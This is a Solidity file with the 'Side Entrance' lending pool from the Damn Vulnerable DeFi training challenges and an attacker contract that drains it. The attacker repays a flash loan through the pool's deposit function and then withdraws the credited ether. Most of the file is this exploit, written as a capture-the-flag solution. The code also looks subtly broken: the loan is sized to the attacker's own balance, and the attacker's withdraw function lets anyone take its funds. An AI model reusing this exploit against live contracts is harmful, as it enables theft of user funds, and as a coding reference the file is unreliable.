// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

// attacker contract
 
contract Attack{
    SideEntranceLenderPool public pool;
    constructor(SideEntranceLenderPool _address){
        pool=SideEntranceLenderPool(_address);
    }
    
    function attack( ) external    {
        pool.flashLoan(address(this).balance);
        pool.withdraw();
        // _address.withdraw();





    }
    function withdraw() public {
        payable (msg.sender).transfer(address(this).balance);
    }

    function execute() external payable{

        console.log("msg.sender under excute function",msg.sender,msg.sender.balance);
        pool.deposit{value:msg.value}();


    }

    fallback () external  payable {
        console.log("recieve ether in fallback function of smart contract(address,value)",msg.sender,msg.value);

    }




    

}

